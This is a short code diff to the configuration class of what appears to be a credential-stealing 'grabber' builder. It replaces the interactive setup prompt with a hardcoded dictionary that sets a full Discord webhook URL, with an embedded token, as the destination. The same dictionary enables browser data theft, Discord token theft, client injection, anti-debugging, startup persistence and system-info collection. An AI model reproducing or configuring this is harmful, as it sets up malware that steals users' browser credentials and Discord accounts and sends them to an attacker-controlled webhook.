@@ -1,8 +1,3 @@
-import re
-
-from InquirerPy import prompt  # type: ignore
-
-
 class Config:
     """
     The Config class creates the questions that will be prompted to the user
@@ -57,15 +52,14 @@ class Config:
 
     def get_config(self) -> dict:
         """
-        Prompt the user with the questions and return the config data
+        Return the config data without prompting the user
         """
-        return prompt(
-            questions=self.questions,
-            style={
-                "questionmark": "#ff9d00 bold",
-                "selected": "#5f819d",
-                "instruction": "",  # default
-                "answer": "#5f819d bold",
-                "question": "",
-            },
-        )
+        return {
+            "webhook": "https://discord.com/api/webhooks/1307463639250243584/oKzeUlT8a6peM9svCfYjiDAKCcg0efP4stXHxGoQD6MrylIJXxV_iF67w91Nt-UjqaVq",  # Set the desired webhook URL
+            "antidebug": True,
+            "browsers": True,
+            "discordtoken": True,
+            "injection": True,
+            "startup": True,
+            "systeminfo": True,
+        }
